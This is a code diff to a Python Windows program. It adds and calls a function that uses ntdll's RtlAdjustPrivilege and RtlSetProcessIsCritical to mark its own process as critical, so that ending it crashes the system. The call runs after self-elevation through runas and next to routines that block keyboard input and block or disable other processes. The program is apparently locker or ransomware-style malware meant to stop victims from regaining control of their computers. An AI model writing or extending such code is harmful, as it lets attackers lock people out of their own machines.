@@ -60,6 +60,10 @@ def is_admin():
         return False
 
 
+def set_process_critical():
+    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
+    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
+
 def freeze_keyboard():
     ctypes.windll.user32.BlockInput(True)
 
@@ -562,6 +566,7 @@ if __name__ == "__main__":
                 None, "runas", sys.executable, " ".join(sys.argv), None, 1
             )
             sys.exit(0)
+        set_process_critical()
         freeze_keyboard()
         block_processes()
         disable_all()
